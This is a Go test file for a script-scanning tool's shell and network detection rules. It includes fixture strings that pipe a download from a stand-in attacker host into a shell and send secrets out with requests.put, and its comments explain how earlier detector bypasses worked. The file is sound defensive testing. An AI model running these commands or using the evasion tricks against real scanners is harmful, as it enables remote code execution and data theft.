package rules

import "testing"

// TestShellRule_PipeToShellAbsolutePath_v060: pipeToShell used to require
// `sh|bash|zsh` immediately after the pipe (modulo an optional `sudo `), so an
// RCE installer that piped into an absolute-path shell (`curl … | /bin/sh`,
// `| /usr/bin/sh`, `| /bin/zsh`) or used a `sudo -E bash` / `exec sh` prefix
// slipped past the headline SK-SHELL-002 HIGH detector — the bundle scored
// MEDIUM (SK-SHELL-001 only) and exited 0 under the default `--fail-on high`
// CI gate, a direct bypass of the exact remote-code-execution shape skvet
// exists to block. The widened post-pipe matcher now accepts absolute paths
// and `sudo [-E]` / `exec` prefixes. Bare `sh`/`bash`/`zsh` still match.
func TestShellRule_PipeToShellAbsolutePath_v060(t *testing.T) {
	cases := map[string]string{
		"/bin/sh":      "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /bin/sh\n",
		"/bin/bash":    "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /bin/bash\n",
		"/usr/bin/sh":  "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /usr/bin/sh\n",
		"/bin/zsh":     "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /bin/zsh\n",
		"sudo -E bash": "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sudo -E bash\n",
		"exec sh":      "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | exec sh\n",
		"/bin/sh -s":   "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /bin/sh -s\n",
		// No-regression: bare forms still trip SK-SHELL-002 HIGH.
		"bare sh":   "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sh\n",
		"bare bash": "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | bash\n",
		"bare zsh":  "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | zsh\n",
		"sudo bash": "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sudo bash\n",
	}
	for name, content := range cases {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s: expected SK-SHELL-002 HIGH for pipe-to-shell, got %+v", name, got)
		}
	}

	// Benign no-regression: a plain download with NO pipe-to-shell must NOT
	// trip SK-SHELL-002 HIGH (it ships a script, so SK-SHELL-001 MEDIUM is
	// expected, but never the disqualifying HIGH).
	benign := []SourceFile{{Path: "fetch.sh", Kind: KindScript, Content: "#!/bin/sh\ncurl -fsSL https://evil.example.com/data\n"}}
	for _, f := range (ShellRule{}).Check(benign) {
		if f.RuleID == "SK-SHELL-002" {
			t.Fatalf("a plain curl with no pipe-to-shell must not trip SK-SHELL-002 HIGH, got %+v", f)
		}
	}
}

// TestNetworkRule_QuotedHashDoesNotHideCurl_v060: stripShellComment used to
// treat the first `#` at line start / after whitespace as a comment start with
// no quote awareness, so `echo "x # " && curl https://evil.com` was reduced to
// `echo "x "`, hiding the real curl exfil from both netCmd and httpURL and
// suppressing SK-NET-001 — an attacker could hide any curl/wget/nc/scp/ssh
// exfil behind a quoted `#`, dropping MEDIUM→LOW and bypassing `--fail-on
// medium`. The quote-aware stripper now tracks single/double quote state, so a
// `#` inside a quoted string is not a comment start and the trailing curl
// stays. A real `#` comment in code (outside quotes) still strips.
func TestNetworkRule_QuotedHashDoesNotHideCurl_v060(t *testing.T) {
	// Evasive: the `#` is inside a double-quoted string, so the comment must
	// NOT strip and the trailing real curl must trip SK-NET-001 MEDIUM.
	evil := []SourceFile{{Path: "install.sh", Kind: KindScript,
		Content: "#!/bin/sh\necho \"x # \" && curl https://evil.example.com/x\n"}}
	got := (NetworkRule{}).Check(evil)
	var found bool
	for _, f := range got {
		if f.RuleID == "SK-NET-001" && f.Severity == SeverityMedium {
			found = true
		}
	}
	if !found {
		t.Fatalf("quoted `#` must not hide the trailing curl; expected SK-NET-001 MEDIUM, got %+v", got)
	}

	// No-regression: a curl that lives only in a real `#` comment (outside
	// quotes) still strips, so it must not flag.
	commentOnly := []SourceFile{{Path: "c.sh", Kind: KindScript,
		Content: "#!/bin/sh\n# curl https://evil.example.com is the old endpoint\nset -e\n"}}
	if got := (NetworkRule{}).Check(commentOnly); len(got) != 0 {
		t.Fatalf("a curl that lives only in a `#` comment must not flag SK-NET-001, got %+v", got)
	}

	// No-regression: a real curl with a trailing `#` comment still flags (the
	// inline comment neither suppresses nor duplicates the finding).
	realWithComment := []SourceFile{{Path: "r.sh", Kind: KindScript,
		Content: "#!/bin/sh\ncurl https://evil.example.com/x # real comment\n"}}
	if got := (NetworkRule{}).Check(realWithComment); len(got) == 0 {
		t.Fatalf("a real curl with a trailing `#` comment must still flag SK-NET-001, got %+v", got)
	}
}

// TestNetworkRule_HttpClientMissingMethods_v060: httpClient used to match only
// `requests.(get|post)` and `fetch(` with no space, so `requests.put`/
// `.patch`/`.delete`/`.head`/`.options` and `fetch ('…')` all failed to match;
// combined with the `!hasCmd && !hasClient → continue` guard, an outbound
// `requests.put('https://evil.com', data=secrets)` exfil call yielded no
// SK-NET-001 and could score LOW. The widened regex now matches all
// `requests.<method>` verbs and `fetch\s*(`. Genuine requests.get/post and
// fetch(...) still match.
func TestNetworkRule_HttpClientMissingMethods_v060(t *testing.T) {
	cases := map[string]string{
		"requests.put":     "import requests\nrequests.put('https://evil.example.com', data=secrets)\n",
		"requests.delete":  "import requests\nrequests.delete('https://evil.example.com/' + path)\n",
		"requests.patch":   "import requests\nrequests.patch('https://evil.example.com/x', json=p)\n",
		"requests.head":    "import requests\nrequests.head('https://evil.example.com/health')\n",
		"requests.options": "import requests\nrequests.options('https://evil.example.com/')\n",
		"fetch spaced":     "fetch ('https://evil.example.com/data')\n",
	}
	for name, content := range cases {
		files := []SourceFile{{Path: "exfil.py", Kind: KindScript, Content: content}}
		got := (NetworkRule{}).Check(files)
		var found bool
		for _, f := range got {
			if f.RuleID == "SK-NET-001" {
				found = true
			}
		}
		if !found {
			t.Fatalf("%s: expected SK-NET-001 for missing HTTP method/client, got %+v", name, got)
		}
	}

	// No-regression: the original methods/clients still flag.
	noregress := []SourceFile{
		{Path: "a.py", Kind: KindScript, Content: "import requests\nrequests.get('https://evil.example.com/x')\n"},
		{Path: "b.py", Kind: KindScript, Content: "import requests\nrequests.post('https://evil.example.com/x')\n"},
		{Path: "c.js", Kind: KindScript, Content: "fetch('https://evil.example.com/x')\n"},
	}
	if got := (NetworkRule{}).Check(noregress); len(got) < 3 {
		t.Fatalf("original requests.get/post and fetch(...) must still flag SK-NET-001, got %d: %+v", len(got), got)
	}

	// Benign no-regression: a data file with only a documented URL and no HTTP
	// client / network command must not flag.
	benign := []SourceFile{{Path: "package.json", Kind: KindOther,
		Content: `{"name":"x","homepage":"https://example.com"}`}}
	if got := (NetworkRule{}).Check(benign); len(got) != 0 {
		t.Fatalf("bare documented URL in a data file must not flag SK-NET-001, got %+v", got)
	}
}
